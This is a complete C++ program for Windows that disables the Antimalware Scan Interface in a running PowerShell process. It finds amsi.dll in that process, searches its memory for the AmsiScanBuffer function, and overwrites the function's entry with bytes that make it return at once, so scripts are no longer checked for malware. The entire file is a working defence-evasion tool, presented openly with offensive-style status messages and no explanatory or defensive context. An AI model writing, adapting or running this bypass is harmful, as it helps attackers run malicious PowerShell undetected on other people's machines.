#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>

#define PROCESS_ACCESS (PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION)

// Function prototypes
bool ReadBuffer(HANDLE handle, LPVOID baseAddress, const std::vector<BYTE>& amsiScanBuffer, LPVOID& resultAddress);
bool WriteBuffer(HANDLE handle, LPVOID address, const std::vector<BYTE>& buffer);
LPVOID GetAmsiScanBufferAddress(HANDLE handle, LPVOID baseAddress);
bool PatchAmsiScanBuffer(HANDLE handle, LPVOID funcAddress);
LPVOID GetAmsiDllBaseAddress(HANDLE handle, DWORD pid);
DWORD GetCurrentPowershellPID();

// Function to bypass AMSI
bool AMSIBYASS() {
    // Get the PID of the current PowerShell process
    DWORD pid = GetCurrentPowershellPID();
    if (pid == 0) {
        std::cerr << "[-] Error finding PowerShell process." << std::endl;
        return false;
    }

    HANDLE processHandle = OpenProcess(PROCESS_ACCESS, FALSE, pid);
    if (!processHandle) {
        std::cerr << "[-] Failed to open process with PID " << pid << ". Error: " << GetLastError() << std::endl;
        return false;
    }

    std::cout << "[+] Got process handle of PID " << pid << ": " << std::hex << (uintptr_t)processHandle << std::endl;
    std::cout << "[+] Trying to find AmsiScanBuffer in process memory..." << std::endl;

    // Get the base address of AMSI DLL in the process
    LPVOID amsiDllBaseAddress = GetAmsiDllBaseAddress(processHandle, pid);
    if (!amsiDllBaseAddress) {
        std::cerr << "[-] Error finding AmsiDllBaseAddress in process with PID " << pid << "." << std::endl;
        std::cerr << "[-] Error: " << GetLastError() << std::endl;
        CloseHandle(processHandle);
        return false;
    }

    std::cout << "[+] Trying to patch AmsiScanBuffer found at " << std::hex << (uintptr_t)amsiDllBaseAddress << std::endl;

    // Patch the AMSI scan buffer in the process
    bool success = PatchAmsiScanBuffer(processHandle, amsiDllBaseAddress);

    // Close the process handle
    CloseHandle(processHandle);

    if (!success) {
        std::cerr << "[-] Error patching AmsiScanBuffer in process with PID " << pid << "." << std::endl;
        std::cerr << "[-] Error: " << GetLastError() << std::endl;
        return false;
    }

    std::cout << "[+] Success patching AmsiScanBuffer in process with PID " << pid << std::endl;
    return true;
}



bool ReadBuffer(HANDLE handle, LPVOID baseAddress, const std::vector<BYTE>& amsiScanBuffer, LPVOID& resultAddress) {
    SIZE_T bufferSize = amsiScanBuffer.size();
    std::vector<BYTE> buffer(bufferSize);
    SIZE_T bytesRead;

    while (true) {
        if (!ReadProcessMemory(handle, baseAddress, buffer.data(), bufferSize, &bytesRead)) {
            return false;
        }

        // Match the signature of AmsiScanBuffer or already patched buffer
        if (buffer == amsiScanBuffer || (buffer[0] == 0x29 && buffer[1] == 0xc0 && buffer[2] == 0xc3)) {
            resultAddress = baseAddress;
            return true;
        } else {
            baseAddress = (BYTE*)baseAddress + 1;
        }
    }
}

bool WriteBuffer(HANDLE handle, LPVOID address, const std::vector<BYTE>& buffer) {
    DWORD oldProtect;
    SIZE_T bytesWritten;

    // Change memory protection to PAGE_READWRITE
    if (!VirtualProtectEx(handle, address, buffer.size(), PAGE_READWRITE, &oldProtect)) {
        std::cerr << "[-] VirtualProtectEx Error: " << GetLastError() << std::endl;
        return false;
    }

    // Write the buffer to the process memory
    if (!WriteProcessMemory(handle, address, buffer.data(), buffer.size(), &bytesWritten)) {
        std::cerr << "[-] WriteProcessMemory Error: " << GetLastError() << std::endl;
        return false;
    }

    return true;
}

LPVOID GetAmsiScanBufferAddress(HANDLE handle, LPVOID baseAddress) {
    std::vector<BYTE> amsiScanBuffer = {
        0x4c, 0x8b, 0xdc, // mov r11,rsp
        0x49, 0x89, 0x5b, 0x08, // mov qword ptr [r11+8],rbx
        0x49, 0x89, 0x6b, 0x10, // mov qword ptr [r11+10h],rbp
        0x49, 0x89, 0x73, 0x18, // mov qword ptr [r11+18h],rsi
        0x57, // push rdi
        0x41, 0x56, // push r14
        0x41, 0x57, // push r15
        0x48, 0x83, 0xec, 0x70 // sub rsp,70h
    };

    LPVOID resultAddress;
    if (!ReadBuffer(handle, baseAddress, amsiScanBuffer, resultAddress)) {
        return nullptr;
    }
    return resultAddress;
}

bool PatchAmsiScanBuffer(HANDLE handle, LPVOID funcAddress) {
    std::vector<BYTE> patchPayload = {
        0x29, 0xc0, // xor eax, eax
        0xc3        // ret
    };

    DWORD oldProtect;
    if (!VirtualProtectEx(handle, funcAddress, patchPayload.size(), PAGE_READWRITE, &oldProtect)) {
        std::cerr << "[-] VirtualProtectEx Error: " << GetLastError() << std::endl;
        return false;
    }

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(handle, funcAddress, patchPayload.data(), patchPayload.size(), &bytesWritten)) {
        std::cerr << "[-] WriteProcessMemory Error: " << GetLastError() << std::endl;
        return false;
    }

    // Restore original protection
    if (!VirtualProtectEx(handle, funcAddress, patchPayload.size(), oldProtect, &oldProtect)) {
        std::cerr << "[-] VirtualProtectEx Restore Error: " << GetLastError() << std::endl;
        return false;
    }

    return true;
}

LPVOID GetAmsiDllBaseAddress(HANDLE handle, DWORD pid) {
    MODULEENTRY32 me32 = {0};
    me32.dwSize = sizeof(MODULEENTRY32);
    HANDLE snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);

    if (snapshotHandle == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] CreateToolhelp32Snapshot Error: " << GetLastError() << std::endl;
        return nullptr;
    }

    if (Module32First(snapshotHandle, &me32)) {
        do {
            if (strcmp(me32.szModule, "amsi.dll") == 0) {
                std::cout << "[+] Found base address of " << me32.szModule << ": " << std::hex << (uintptr_t)me32.modBaseAddr << std::endl;
                CloseHandle(snapshotHandle);
                return GetAmsiScanBufferAddress(handle, me32.modBaseAddr);
            }
        } while (Module32Next(snapshotHandle, &me32));
    }

    std::cerr << "[-] Error finding AMSI DLL in process with PID " << pid << "." << std::endl;
    CloseHandle(snapshotHandle);
    return nullptr;
}

DWORD GetCurrentPowershellPID() {
    HANDLE snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshotHandle == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] CreateToolhelp32Snapshot Error: " << GetLastError() << std::endl;
        return 0;
    }

    PROCESSENTRY32 pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshotHandle, &pe32)) {
        do {
            if (strcmp(pe32.szExeFile, "powershell.exe") == 0) {
                CloseHandle(snapshotHandle);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(snapshotHandle, &pe32));
    }

    std::cerr << "[-] Error finding PowerShell process." << std::endl;
    CloseHandle(snapshotHandle);
    return 0;
}

int main() {
    if (!AMSIBYASS()) {
        return 1;
    }

    // Pause to keep console window open
    std::cout << "Press any key to exit...";
    std::cin.get();

    return 0;
}

